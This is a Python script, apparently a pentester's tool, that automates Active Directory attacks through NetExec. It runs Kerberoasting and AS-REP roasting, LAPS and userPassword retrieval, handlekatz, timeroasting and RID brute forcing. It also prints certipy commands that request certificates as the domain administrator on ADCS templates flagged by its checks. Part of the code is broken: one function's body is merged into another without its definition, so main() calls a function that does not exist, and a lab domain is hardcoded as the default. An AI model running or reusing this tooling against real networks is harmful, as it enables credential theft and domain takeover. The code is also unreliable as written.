#!/usr/bin/env python3
"""
Auto AD Recon NetExec Script
Automated Active Directory reconnaissance and enumeration tool using NetExec.
Supports comprehensive LDAP and SMB enumeration with various authentication methods.

Author: Abhishek Joshi (kernel-injection)
GitHub: https://github.com/kernel-injection
LinkedIn: https://www.linkedin.com/in/reverse-shell

Use only for authorized penetration testing and security research.
"""

import subprocess
import sys
import argparse
import time
import re
import os
from typing import List, Dict

# ANSI color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
    # Professional color scheme
    PURPLE = '\033[35m'
    YELLOW = '\033[33m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    BLUE = '\033[34m'
    CYAN = '\033[36m'
    ORANGE = '\033[38;5;208m'  # Professional orange
    WHITE = '\033[37m'
    GRAY = '\033[90m'          # Professional gray for separators

def print_banner():
    """Print colorful banner."""
    print(f"{Colors.GRAY}{'='*100}{Colors.ENDC}")
    print(f"{Colors.CYAN}                    Auto AD Recon NetExec Script{Colors.ENDC}")
    print(f"{Colors.YELLOW}                 Comprehensive AD Enumeration & Reconnaissance{Colors.ENDC}")
    print(f"{Colors.GRAY}{'='*100}{Colors.ENDC}")
    print(f"{Colors.BLUE}Author: {Colors.OKGREEN}Abhishek Joshi (kernel-injection){Colors.ENDC}")
    print(f"{Colors.BLUE}GitHub: {Colors.OKCYAN}https://github.com/kernel-injection{Colors.ENDC}")
    print(f"{Colors.BLUE}LinkedIn: {Colors.OKCYAN}https://www.linkedin.com/in/reverse-shell{Colors.ENDC}")
    print(f"{Colors.GRAY}{'='*100}{Colors.ENDC}")

def print_status(msg: str):
    """Print status message in blue."""
    print(f"{Colors.BLUE}[INFO]{Colors.ENDC} {Colors.CYAN}{msg}{Colors.ENDC}")

def print_success(msg: str):
    """Print success message in green."""
    print(f"{Colors.GREEN}[SUCCESS]{Colors.ENDC} {Colors.OKGREEN}{msg}{Colors.ENDC}")

def print_error(msg: str):
    """Print error message in red."""
    print(f"{Colors.RED}[ERROR]{Colors.ENDC} {Colors.FAIL}{msg}{Colors.ENDC}")

def print_warning(msg: str):
    """Print warning message in yellow."""
    print(f"{Colors.YELLOW}[WARNING]{Colors.ENDC} {Colors.WARNING}{msg}{Colors.ENDC}")

def print_module_header(module_name: str, protocol: str, target: str):
    """Print colorful module header."""
    print(f"\n{Colors.ORANGE}{'='*70}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}Module: {Colors.YELLOW}{module_name}{Colors.ENDC} {Colors.BOLD}{Colors.BLUE}({protocol.upper()}){Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.BLUE}Target: {Colors.OKGREEN}{target}{Colors.ENDC}")
    print(f"{Colors.ORANGE}{'='*70}{Colors.ENDC}")

def print_command(cmd: str):
    """Print command in a distinct color."""
    print(f"{Colors.OKCYAN}Command: {Colors.BOLD}{cmd}{Colors.ENDC}")

def handle_command_result(result, flag_name: str, cmd_type: str = "flag") -> str:
    """Handle command results and provide appropriate status messages."""
    if result.returncode == 0:
        return f"SUCCESS - {cmd_type} {flag_name} completed successfully"
    elif result.returncode == -11:
        return f"WARNING - {cmd_type} {flag_name} failed with segmentation fault (known NetExec issue)"
    elif result.returncode == 1:
        return f"WARNING - {cmd_type} {flag_name} failed (authentication or access denied)"
    elif result.returncode == 2:
        return f"WARNING - {cmd_type} {flag_name} failed (invalid arguments or target unreachable)"
    elif result.returncode == 130:
        return f"WARNING - {cmd_type} {flag_name} interrupted (Ctrl+C)"
    elif result.returncode == 128:
        return f"WARNING - {cmd_type} {flag_name} failed (invalid exit code)"
    elif result.returncode in [-2, -9]:
        return f"WARNING - {cmd_type} {flag_name} killed or terminated"
    elif result.returncode < 0:
        return f"ERROR - {cmd_type} {flag_name} crashed (signal {abs(result.returncode)})"
    else:
        return f"ERROR - {cmd_type} {flag_name} failed (return code: {result.returncode})"

def run_command_safely(cmd: list, timeout: int = 120, flag_name: str = "", cmd_type: str = "flag") -> Dict:
    """Safely run a command with comprehensive error handling."""
    try:
        print_command(' '.join(cmd))
        print(f"{Colors.GRAY}{'-' * 80}{Colors.ENDC}")
        
        result = subprocess.run(cmd, timeout=timeout)
        
        # Handle different return codes
        status_msg = handle_command_result(result, flag_name, cmd_type)
        
        if result.returncode == 0:
            print_success(status_msg.replace("SUCCESS - ", ""))
        elif result.returncode in [-11, 1, 2]:
            print_warning(status_msg.replace("WARNING - ", ""))
        else:
            print_error(status_msg.replace("ERROR - ", ""))
        
        return {
            'returncode': result.returncode,
            'stdout': 'Output displayed above',
            'stderr': 'Errors displayed above',
            'status': status_msg
        }
    
    except subprocess.TimeoutExpired:
        timeout_msg = f"{cmd_type} {flag_name} timed out after {timeout} seconds"
        print_warning(timeout_msg)
        return {
            'returncode': -1,
            'stdout': '',
            'stderr': 'Command timed out',
            'status': f"TIMEOUT - {timeout_msg}"
        }
    except FileNotFoundError:
        error_msg = f"NetExec not found - please install NetExec"
        print_error(error_msg)
        return {
            'returncode': -127,
            'stdout': '',
            'stderr': 'NetExec not found',
            'status': f"ERROR - {error_msg}"
        }
    except PermissionError:
        error_msg = f"Permission denied running {cmd_type} {flag_name}"
        print_error(error_msg)
        return {
            'returncode': -13,
            'stdout': '',
            'stderr': 'Permission denied',
            'status': f"ERROR - {error_msg}"
        }
    except Exception as e:
        error_msg = f"Unexpected error running {cmd_type} {flag_name}: {e}"
        print_error(error_msg)
        return {
            'returncode': -999,
            'stdout': '',
            'stderr': str(e),
            'status': f"ERROR - {error_msg}"
        }

def analyze_adcs_output(output: str, target: str, username: str = None, password: str = None) -> List[str]:
    """Analyze ADCS output for ESC1-ESC8 vulnerabilities and ACL misconfigurations."""
    vulnerabilities = []
    
    # Debug: Print a sample of the output to understand the format
    print(f"\n{Colors.GRAY}[DEBUG] ADCS Output Sample (first 500 chars):{Colors.ENDC}")
    print(f"{Colors.GRAY}{output[:500]}...{Colors.ENDC}")
    
    # Extract CA Name for commands
    ca_name_match = re.search(r'CA Name\s*:\s*([^\n\r]+)', output, re.IGNORECASE)
    ca_name = ca_name_match.group(1).strip() if ca_name_match else "fluffy-DC01-CA"
    
    # ESC1: SubCA template analysis
    if re.search(r'Template Name\s*:\s*SubCA.*?Client Authentication\s*:\s*True.*?Enrollee Supplies Subject\s*:\s*True', output, re.DOTALL | re.IGNORECASE):
        vulnerabilities.append("ESC1 - SubCA Template Vulnerability (HIGH RISK)")
        vulnerabilities.append(f"   Command: certipy req -username {username} -password '{password}' -ca '{ca_name}' -target {target} -template SubCA -upn administrator@fluffy.htb")
        vulnerabilities.append("   Impact: Can impersonate any user including Domain Admins")
    
    # ESC2: Look for templates with Any Purpose = True
    esc2_templates = re.findall(r'Template Name\s*:\s*([^\n\r]+).*?Any Purpose\s*:\s*True', output, re.DOTALL | re.IGNORECASE)
    for template in esc2_templates:
        template = template.strip()
        vulnerabilities.append(f"ESC2 - Any Purpose Template: {template}")
        vulnerabilities.append(f"   Command: certipy req -username {username} -password '{password}' -ca '{ca_name}' -target {target} -template {template} -upn administrator@fluffy.htb")
    
    # ESC6: Check for EDITF_ATTRIBUTESUBJECTALTNAME2 flag
    if re.search(r'User Specified SAN\s*:\s*Enabled', output, re.IGNORECASE):
        vulnerabilities.append("ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Enabled (HIGH RISK)")
        vulnerabilities.append(f"   Command: certipy req -username {username} -password '{password}' -ca '{ca_name}' -target {target} -template User -upn administrator@fluffy.htb")
    
    # Check for enabled templates with Enrollee Supplies Subject
    enrollee_supplies_templates = re.findall(r'Template Name\s*:\s*([^\n\r]+).*?Enabled\s*:\s*True.*?Enrollee Supplies Subject\s*:\s*True', output, re.DOTALL | re.IGNORECASE)
    for template in enrollee_supplies_templates:
        template = template.strip()
        if template not in ['SubCA', 'CrossCA']:
            vulnerabilities.append(f"POTENTIAL-ESC1 - Enrollee Supplies Subject template: {template}")
            vulnerabilities.append(f"   Command: certipy req -username {username} -password '{password}' -ca '{ca_name}' -target {target} -template {template} -upn administrator@fluffy.htb")
    
    if not vulnerabilities:
        vulnerabilities.append("INFO - No obvious ESC1-ESC8 vulnerabilities detected")
        vulnerabilities.append(f"   Command: certipy find -username {username} -password '{password}' -target {target} -vulnerable")
    
    return vulnerabilities

def print_adcs_summary(vulnerabilities: List[str], target: str):
    """Print a summary of ADCS vulnerabilities found."""
    print(f"\n{Colors.ORANGE}{'='*80}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}ADCS VULNERABILITY ANALYSIS SUMMARY{Colors.ENDC}")
    print(f"{Colors.ORANGE}{'='*80}{Colors.ENDC}")
    
    if any(vuln.startswith(('ESC', 'POTENTIAL-ESC')) for vuln in vulnerabilities):
        print_success("ADCS Enumeration complete: Found potential vulnerabilities")
        print(f"{Colors.YELLOW}=> See: certipy-ESC-findings.txt{Colors.ENDC}")
        
        print(f"\n{Colors.BOLD}{Colors.RED}VULNERABILITIES FOUND:{Colors.ENDC}")
        for vuln in vulnerabilities:
            if vuln.startswith(('ESC', 'POTENTIAL-ESC')):
                print(f"{Colors.RED}[!] {vuln}{Colors.ENDC}")
            elif vuln.strip().startswith('Command:'):
                print(f"{Colors.CYAN}    {vuln}{Colors.ENDC}")
        
        # Save findings to file
        try:
            with open('certipy-ESC-findings.txt', 'w') as f:
                f.write(f"ADCS Vulnerability Analysis - Target: {target}\n")
                f.write("=" * 60 + "\n\n")
                for vuln in vulnerabilities:
                    f.write(f"{vuln}\n")
                f.write(f"\nAnalysis completed at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            print(f"\n{Colors.GREEN}[+] Findings saved to: certipy-ESC-findings.txt{Colors.ENDC}")
        except Exception as e:
            print_error(f"Could not save findings to file: {e}")
    else:
        print_success("ADCS Enumeration complete: No ESC1–ESC8 vulnerabilities found")

def parse_daclread_for_abuse(output: str) -> List[str]:
    """Parse daclread output to extract only abusable ACL findings."""
    abusable_acls = []
    
    print(f"\n{Colors.ORANGE}{'='*70}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}DACLREAD ABUSE ANALYSIS{Colors.ENDC}")
    print(f"{Colors.ORANGE}{'='*70}{Colors.ENDC}")
    
    # Look for high-privilege ACEs that can be abused
    dangerous_permissions = [
        'GenericAll', 'FullControl', 'GENERIC_ALL',
        'GenericWrite', 'GENERIC_WRITE', 
        'WriteOwner', 'WRITE_OWNER',
        'WriteDacl', 'WriteDACL', 'WRITE_DACL',
        'AllExtendedRights', 'EXTENDED_RIGHT',
        'ResetPassword', 'RESET_PASSWORD',
        'WriteProperty', 'WRITE_PROPERTY'
    ]
    
    # Extract target object info
    target_match = re.search(r'Target principal domain in LDAP.*?CN=([^,]+)', output, re.IGNORECASE)
    target_object = target_match.group(1) if target_match else "Unknown"
    
    # Parse ACE entries for dangerous permissions
    ace_blocks = re.findall(r'ACE\[\d+\] info.*?(?=ACE\[\d+\]|$)', output, re.DOTALL)
    
    for ace_block in ace_blocks:
        # Extract ACE details
        ace_type_match = re.search(r'ACE Type\s*:\s*([^\n]+)', ace_block)
        access_mask_match = re.search(r'Access mask\s*:\s*([^\n]+)', ace_block)
        trustee_match = re.search(r'Trustee \(SID\)\s*:\s*([^\n]+)', ace_block)
        
        if ace_type_match and access_mask_match:
            ace_type = ace_type_match.group(1).strip()
            access_mask = access_mask_match.group(1).strip()
            trustee = trustee_match.group(1).strip() if trustee_match else "Unknown"
            
            # Check for dangerous permissions
            for dangerous_perm in dangerous_permissions:
                if dangerous_perm.lower() in access_mask.lower():
                    # Check if it's an ALLOW ace (not DENY)
                    if 'ALLOW' in ace_type:
                        abusable_acls.append(f"DANGEROUS - {dangerous_perm} permission found")
                        abusable_acls.append(f"   Target: {target_object}")
                        abusable_acls.append(f"   Trustee: {trustee}")
                        abusable_acls.append(f"   Access: {access_mask}")
                        
                        # Provide specific abuse guidance
                        if dangerous_perm in ['GenericAll', 'FullControl']:
                            abusable_acls.append("   ABUSE: Full control - can modify any attribute")
                        elif dangerous_perm in ['GenericWrite', 'WriteProperty']:
                            abusable_acls.append("   ABUSE: Can modify object properties - potential for privilege escalation")
                        elif dangerous_perm in ['WriteOwner']:
                            abusable_acls.append("   ABUSE: Can change object ownership then grant full control")
                        elif dangerous_perm in ['WriteDacl', 'WriteDACL']:
                            abusable_acls.append("   ABUSE: Can modify ACL - grant yourself full control")
                        elif dangerous_perm in ['ResetPassword']:
                            abusable_acls.append("   ABUSE: Can reset user passwords - account takeover")
                        elif dangerous_perm in ['AllExtendedRights']:
                            abusable_acls.append("   ABUSE: Extended rights - check for specific privileges")
                        
                        break  # Found dangerous permission, move to next ACE
    
    # Look for specific abusable scenarios in the output
    if 'User-Account-Restrictions' in output:
        abusable_acls.append("INFO - User-Account-Restrictions ACE found")
        abusable_acls.append("   Potential: May allow modification of user account settings")
    
    if 'BUILTIN\\Pre-Windows 2000 Compatible Access' in output:
        abusable_acls.append("WARNING - Pre-Windows 2000 Compatible Access group detected")
        abusable_acls.append("   Risk: Legacy group with potentially excessive permissions")
    
    # Check for interesting trustees (non-admin users with permissions)
    interesting_trustees = re.findall(r'Trustee \(SID\)\s*:\s*([^\n]*(?:Users|Everyone|Authenticated Users))', output, re.IGNORECASE)
    for trustee in interesting_trustees:
        if 'Domain Users' in trustee or 'Everyone' in trustee or 'Authenticated Users' in trustee:
            abusable_acls.append(f"INTERESTING - Broad group has permissions: {trustee}")
            abusable_acls.append("   Check: Review what permissions these groups have")
    
    return abusable_acls

def print_daclread_abuse_summary(abusable_acls: List[str]):
    """Print summary of abusable ACL findings from daclread."""
    if abusable_acls:
        print(f"\n{Colors.BOLD}{Colors.RED}ABUSABLE ACL FINDINGS:{Colors.ENDC}")
        for finding in abusable_acls:
            if finding.startswith('DANGEROUS'):
                print(f"{Colors.RED}[!] {finding}{Colors.ENDC}")
            elif finding.startswith('WARNING'):
                print(f"{Colors.YELLOW}[!] {finding}{Colors.ENDC}")
            elif finding.startswith('INTERESTING'):
                print(f"{Colors.CYAN}[+] {finding}{Colors.ENDC}")
            elif finding.startswith('INFO'):
                print(f"{Colors.BLUE}[i] {finding}{Colors.ENDC}")
            elif finding.strip().startswith('ABUSE:'):
                print(f"{Colors.PURPLE}    {finding}{Colors.ENDC}")
            else:
                print(f"{Colors.GRAY}    {finding}{Colors.ENDC}")
        
        # Save findings
        try:
            with open('daclread-abuse-findings.txt', 'w') as f:
                f.write("DACLREAD Abuse Analysis Results\n")
                f.write("=" * 40 + "\n\n")
                for finding in abusable_acls:
                    f.write(f"{finding}\n")
                f.write(f"\nAnalysis completed at: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            print(f"\n{Colors.GREEN}[+] ACL abuse findings saved to: daclread-abuse-findings.txt{Colors.ENDC}")
        except Exception as e:
            print_error(f"Could not save ACL findings: {e}")
    else:
        print(f"{Colors.GREEN}[+] No obviously abusable ACL permissions detected{Colors.ENDC}")
        print(f"{Colors.GRAY}    Note: Manual review of full DACL output may reveal additional opportunities{Colors.ENDC}")
    """Quick ACL abuse potential check using basic LDAP queries."""
    abuse_findings = []
    
    print(f"\n{Colors.ORANGE}{'='*70}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.CYAN}ACL ABUSE POTENTIAL CHECK{Colors.ENDC}")
    print(f"{Colors.ORANGE}{'='*70}{Colors.ENDC}")
    print_status("Checking for common ACL misconfigurations and abuse potential...")
    
    # Check group memberships
    try:
        cmd = ['netexec', 'ldap', target_ip, '-u', username, '-p', password, '-M', 'groupmembership', '-o', f'USER={username}']
        print_command(' '.join(cmd))
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        if result.returncode == 0:
            output = result.stdout + result.stderr
            print(output)
            
            privileged_groups = ['Domain Admins', 'Enterprise Admins', 'Schema Admins', 'Account Operators', 'Backup Operators']
            for group in privileged_groups:
                if group.lower() in output.lower():
                    abuse_findings.append(f"PRIVILEGE - Current user is member of: {group}")
        
    except Exception as e:
        print_warning(f"Group membership check error: {e}")
    
    # Check for LAPS
    try:
        cmd = ['netexec', 'ldap', target_ip, '-u', username, '-p', password, '-M', 'laps']
        print_command(' '.join(cmd))
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        
        if result.returncode == 0:
            output = result.stdout + result.stderr
            print(output)
            
            if 'LAPS' in output and 'password' in output.lower():
                abuse_findings.append("HIGH - Current user can read LAPS passwords!")
                abuse_findings.append("   Action: Extract LAPS passwords for local admin access")
    
    except Exception as e:
        print_warning(f"LAPS check error: {e}")
    
    # Summary
    if abuse_findings:
        print(f"\n{Colors.BOLD}{Colors.RED}ACL ABUSE POTENTIAL SUMMARY:{Colors.ENDC}")
        for finding in abuse_findings:
            if finding.startswith('HIGH'):
                print(f"{Colors.RED}[!] {finding}{Colors.ENDC}")
            elif finding.startswith('PRIVILEGE'):
                print(f"{Colors.YELLOW}[!] {finding}{Colors.ENDC}")
            else:
                print(f"{Colors.GRAY}    {finding}{Colors.ENDC}")
    else:
        print(f"{Colors.GREEN}[+] No obvious ACL abuse potential detected{Colors.ENDC}")
    
    return abuse_findings

# Enumeration modules for different protocols
AD_ENUMERATION_MODULES = {
    'ldap': [
        'user-desc',           # User Description Enumeration
        'whoami',              # Current User Information
        'groupmembership',     # User Group Membership
        'maq',                 # Machine Account Quota
        'get-desc-users',      # User Descriptions
        'laps',                # LAPS Password Retrieval
        'get-network',         # Network Information
        'daclread',            # DACL Permissions (added back with parsing)
        'get-userPassword',    # User Passwords
        'get-unixUserPassword', # Unix User Passwords
        'pso',                 # Password Settings Objects
        'enum_trusts',         # Domain Trust Enumeration
        'pre2k',               # Pre-Windows 2000 Computers
        'adcs'                 # Certificate Services
    ],
    'smb': [
        'enum_av',             # Antivirus Enumeration
        'spider_plus',         # Advanced File Spidering
        'enum_dns',            # DNS Enumeration
        'enum_ca',             # Certificate Authority
        'handlekatz',          # Handle enumeration
        'reg-query',           # Registry Query
        'whoami',              # Current User (SMB)
        'timeroast'            # Timeroasting Attack (works on SMB)
    ]
}

def get_ldap_builtin_flags(dns_server: str = None) -> tuple:
    """Get LDAP built-in flags."""
    base_flags = [
        '--active-users',                   # Active Users Only
        '--groups',                         # Group Enumeration
        '--get-sid',                        # Domain SID Retrieval
        '--kerberoasting kerb_hashes.txt'   # Kerberoasting Attack
    ]
    
    optional_flags = [
        '--users',                          # User Enumeration (sometimes fails)
        '--asreproast asrep_hashes.txt'     # ASREPRoasting Attack (often fails)
    ]
    
    if dns_server:
        bloodhound_flag = f'--bloodhound --dns-server {dns_server}'
        base_flags.append(bloodhound_flag)
        print_status(f"BloodHound collection enabled with DNS server: {dns_server}")
    else:
        print_warning("BloodHound collection skipped - no DNS server provided (use --dns-server)")
    
    return base_flags, optional_flags

# Built-in NetExec flags for SMB
SMB_BUILTIN_FLAGS = [
    '--shares',            # Share Enumeration
    '--disks',             # Disk Enumeration
    '--loggedon-users',    # Logged-on Users
    '--local-groups',      # Local Groups
    '--pass-pol',          # Password Policy
    '--rid-brute',         # RID Bruteforcing
    '--users',             # Users via SMB
    '--groups'             # Groups via SMB
]

def run_builtin_enumeration(protocol: str, target_ip: str, username: str = None, password: str = None, null_session: bool = False, dns_server: str = None) -> List[Dict]:
    """Run built-in NetExec enumeration flags."""
    results = []
    
    print(f"\n{Colors.GRAY}{'='*90}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.HEADER}Running Built-in Enumeration for {protocol.upper()}{Colors.ENDC}")
    print(f"{Colors.GRAY}{'='*90}{Colors.ENDC}")
    
    # Select appropriate flags based on protocol
    if protocol == 'ldap':
        flags_to_run, optional_flags = get_ldap_builtin_flags(dns_server)
    elif protocol == 'smb':
        flags_to_run = SMB_BUILTIN_FLAGS.copy()
        optional_flags = []
    else:
        print_error(f"Unknown protocol: {protocol}")
        return []
    
    print_status(f"Running {len(flags_to_run)} core built-in flags for {protocol.upper()}")
    
    # Run core flags first
    for i, flag in enumerate(flags_to_run, 1):
        print(f"\n{Colors.YELLOW}[{i}/{len(flags_to_run)}]{Colors.ENDC} {Colors.BOLD}{Colors.CYAN}Running: {flag}{Colors.ENDC}")
        
        cmd = ['netexec', protocol, target_ip]
        
        # Add authentication
        if null_session:
            cmd.extend(['-u', '', '-p', ''])
        elif username:
            cmd.extend(['-u', username])
            if password:
                cmd.extend(['-p', password])
        
        # Add the flag
        flag_parts = flag.split()
        cmd.extend(flag_parts)
        
        # Run command safely
        cmd_result = run_command_safely(cmd, timeout=120, flag_name=flag_parts[0], cmd_type="flag")
        
        result_dict = {
            'type': 'builtin_flag',
            'flag': flag,
            'protocol': protocol,
            **cmd_result
        }
        
        results.append(result_dict)
        time.sleep(1)
    
    # Run optional flags
    if protocol == 'ldap' and optional_flags:
        print(f"\n{Colors.YELLOW}Running optional flags (may fail on some NetExec versions):{Colors.ENDC}")
        
        for i, flag in enumerate(optional_flags, 1):
            print(f"\n{Colors.YELLOW}[OPTIONAL {i}/{len(optional_flags)}]{Colors.ENDC} {Colors.BOLD}{Colors.CYAN}Running: {flag}{Colors.ENDC}")
            
            cmd = ['netexec', protocol, target_ip]
            
            # Add authentication
            if null_session:
                cmd.extend(['-u', '', '-p', ''])
            elif username:
                cmd.extend(['-u', username])
                if password:
                    cmd.extend(['-p', password])
            
            # Add the flag
            flag_parts = flag.split()
            cmd.extend(flag_parts)
            
            # Run command safely
            cmd_result = run_command_safely(cmd, timeout=120, flag_name=flag_parts[0], cmd_type="optional flag")
            
            result_dict = {
                'type': 'builtin_flag_optional',
                'flag': flag,
                'protocol': protocol,
                **cmd_result
            }
            
            results.append(result_dict)
            time.sleep(1)
    
    return results

def run_module(protocol: str, target_ip: str, module: str, username: str = None, password: str = None, null_session: bool = False, module_options: str = None) -> Dict:
    """Run a specific module against the target."""
    cmd = ['netexec', protocol, target_ip]
    
    # Add authentication
    if null_session:
        cmd.extend(['-u', '', '-p', ''])
    elif username:
        cmd.extend(['-u', username])
        if password:
            cmd.extend(['-p', password])
    
    # Add module
    cmd.extend(['-M', module])
    
    # Add module options if provided
    if module_options:
        if ' ' in module_options and '=' in module_options:
            options = module_options.split()
            for option in options:
                cmd.extend(['-o', option])
        else:
            cmd.extend(['-o', module_options])
    
    print_module_header(module, protocol, target_ip)
    if module_options:
        print(f"{Colors.YELLOW}Options: {Colors.OKGREEN}{module_options}{Colors.ENDC}")
    
    try:
        # Capture output for ADCS analysis
        if module == 'adcs':
            print_command(' '.join(cmd))
            print(f"{Colors.ORANGE}{'='*70}{Colors.ENDC}")
            
            result = subprocess.run(cmd, timeout=180, capture_output=True, text=True)
            output = result.stdout + result.stderr
            print(output)
            
            # Handle different return codes for ADCS
            status_msg = handle_command_result(result, module, "module")
            
            if result.returncode == 0:
                print_success(status_msg.replace("SUCCESS - ", ""))
                vulnerabilities = analyze_adcs_output(output, target_ip, username, password)
                print_adcs_summary(vulnerabilities, target_ip)
            else:
                print_warning(status_msg.replace("WARNING - ", "").replace("ERROR - ", ""))
                
            return {
                'type': 'module',
                'module': module,
                'protocol': protocol,
                'options': module_options,
                'returncode': result.returncode,
                'stdout': output,
                'stderr': 'Errors displayed above',
                'status': status_msg
            }
        else:
            # For other modules
            print_command(' '.join(cmd))
            print(f"{Colors.ORANGE}{'='*70}{Colors.ENDC}")
            
            result = subprocess.run(cmd, timeout=180, capture_output=True, text=True)
            output = result.stdout + result.stderr
            print(output)
            
            # Special handling for daclread output parsing
            if module == 'daclread':
                abusable_acls = parse_daclread_for_abuse(output)
                print_daclread_abuse_summary(abusable_acls)
            
            status_msg = handle_command_result(result, module, "module")
            
            if result.returncode == 0:
                print_success(status_msg.replace("SUCCESS - ", ""))
            else:
                print_warning(status_msg.replace("WARNING - ", "").replace("ERROR - ", ""))
            
            return {
                'type': 'module',
                'module': module,
                'protocol': protocol,
                'options': module_options,
                'returncode': result.returncode,
                'stdout': output,
                'stderr': 'Errors displayed above',
                'status': status_msg
            }
    
    except subprocess.TimeoutExpired:
        timeout_msg = f"Module {module} execution timed out after 180 seconds"
        print_warning(timeout_msg)
        return {
            'type': 'module',
            'module': module,
            'protocol': protocol,
            'options': module_options,
            'returncode': -1,
            'stdout': '',
            'stderr': 'Module execution timed out',
            'status': f"TIMEOUT - {timeout_msg}"
        }
    except Exception as e:
        error_msg = f"Unexpected error running module {module}: {e}"
        print_error(error_msg)
        return {
            'type': 'module',
            'module': module,
            'protocol': protocol,
            'options': module_options,
            'returncode': -999,
            'stdout': '',
            'stderr': str(e),
            'status': f"ERROR - {error_msg}"
        }

def main():
    parser = argparse.ArgumentParser(
        description='Auto AD Recon NetExec Script - Comprehensive Active Directory reconnaissance',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""{Colors.CYAN}
Examples:
  # Null session enumeration (both protocols)
  python3 auto_ad_recon.py -t 192.168.1.48 --null-session
  
  # Authenticated enumeration with credentials
  python3 auto_ad_recon.py -t domain.local -u username -pw password123
  
  # LDAP with BloodHound collection (requires DNS server)
  python3 auto_ad_recon.py -t dc.domain.local -u admin -pw pass --dns-server 10.129.169.157

Author: Abhishek Joshi (kernel-injection)
GitHub: https://github.com/kernel-injection
LinkedIn: https://www.linkedin.com/in/reverse-shell
{Colors.ENDC}"""
    )
    
    parser.add_argument('-t', '--target', required=True, help='Target IP address or hostname')
    parser.add_argument('-p', '--protocols', nargs='+', choices=['ldap', 'smb'], 
                       default=['ldap', 'smb'], help='Protocols to test (default: both ldap and smb)')
    parser.add_argument('-u', '--username', help='Username for authentication')
    parser.add_argument('-pw', '--password', help='Password for authentication')
    parser.add_argument('--null-session', action='store_true', 
                       help='Use null session (anonymous authentication)')
    parser.add_argument('--modules-only', action='store_true',
                       help='Run only custom modules, skip built-in flags')
    parser.add_argument('--builtin-only', action='store_true',
                       help='Run only built-in flags, skip custom modules')
    parser.add_argument('-d', '--delay', type=int, default=2, 
                       help='Delay between commands in seconds (default: 2)')
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('--domain', help='Domain name for certain modules')
    parser.add_argument('--dns-server', help='DNS server IP for BloodHound collection')
    
    args = parser.parse_args()
    
    # Print banner
    print_banner()
    
    # Validate NetExec installation
    try:
        subprocess.run(['netexec', '--help'], capture_output=True, timeout=10)
    except (subprocess.TimeoutExpired, FileNotFoundError):
        print_error("NetExec not found. Please install NetExec first.")
        sys.exit(1)
    
    print_status(f"Target: {args.target}")
    print_status(f"Protocols: {', '.join(args.protocols)}")
    
    if args.dns_server:
        print_status(f"DNS Server: {args.dns_server} (for BloodHound collection)")
    
    if args.null_session:
        print_status("Authentication: Null Session (anonymous)")
    elif args.username:
        print_status(f"Username: {args.username}")
        print_status("Authentication: Credentials")
    else:
        print_status("Authentication: No credentials")
    
    all_results = []
    
    for protocol in args.protocols:
        print(f"\n{Colors.ORANGE}{'*'*120}{Colors.ENDC}")
        print(f"{Colors.BOLD}{Colors.HEADER}PROCESSING PROTOCOL: {protocol.upper()}{Colors.ENDC}")
        print(f"{Colors.ORANGE}{'*'*120}{Colors.ENDC}")
        
        # Run built-in enumeration flags
        if not args.modules_only:
            builtin_results = run_builtin_enumeration(
                protocol=protocol,
                target_ip=args.target,
                username=args.username,
                password=args.password,
                null_session=args.null_session,
                dns_server=args.dns_server
            )
            all_results.extend(builtin_results)
        
        # Run custom modules
        if not args.builtin_only and protocol in AD_ENUMERATION_MODULES:
            modules = AD_ENUMERATION_MODULES[protocol]
            
            print(f"\n{Colors.GRAY}{'='*90}{Colors.ENDC}")
            print(f"{Colors.BOLD}{Colors.HEADER}Running Custom Modules for {protocol.upper()}{Colors.ENDC}")
            print(f"{Colors.GRAY}{'='*90}{Colors.ENDC}")
            print_status(f"Found {len(modules)} enumeration modules: {', '.join(modules)}")
            
            for i, module in enumerate(modules, 1):
                print(f"\n{Colors.YELLOW}[{i}/{len(modules)}]{Colors.ENDC} {Colors.BOLD}{Colors.CYAN}Processing module: {module}{Colors.ENDC}")
                
                # Some modules need special options
                module_options = None
                if module == 'groupmembership':
                    module_options = f'USER={args.username}'
                elif module == 'daclread':
                    module_options = 'TARGET=administrator ACTION=read'
                
                # Skip modules known to cause issues
                if module == 'timeroast' and protocol == 'ldap':
                    print_warning(f"Skipping {module} module - not supported for LDAP protocol")
                    continue
                
                result = run_module(
                    protocol=protocol,
                    target_ip=args.target,
                    module=module,
                    username=args.username,
                    password=args.password,
                    null_session=args.null_session,
                    module_options=module_options
                )
                
                all_results.append(result)
                
                # Delay between modules
                if i < len(modules):
                    time.sleep(args.delay)
            
            # Run ACL abuse potential check for LDAP protocol
            if protocol == 'ldap' and args.username:
                acl_findings = check_acl_abuse_potential(args.target, args.username, args.password or '')
                
                # Add ACL findings to results
                all_results.append({
                    'type': 'acl_check',
                    'module': 'acl_abuse_check',
                    'protocol': protocol,
                    'returncode': 0 if acl_findings else 1,
                    'stdout': f'Found {len(acl_findings)} ACL abuse indicators',
                    'stderr': '',
                    'status': 'ACL abuse potential check completed'
                })
    
    # Summary with colors
    print(f"\n{Colors.GRAY}{'='*120}{Colors.ENDC}")
    print(f"{Colors.BOLD}{Colors.HEADER}EXECUTION SUMMARY{Colors.ENDC}")
    print(f"{Colors.GRAY}{'='*120}{Colors.ENDC}")
    
    successful = sum(1 for r in all_results if r['returncode'] == 0)
    failed = len(all_results) - successful
    
    print_status(f"Total commands executed: {len(all_results)}")
    print_success(f"Successful: {successful}")
    print_error(f"Failed: {failed}")
    
    # Categorize results
    builtin_results = [r for r in all_results if r['type'] == 'builtin_flag']
    module_results = [r for r in all_results if r['type'] == 'module']
    
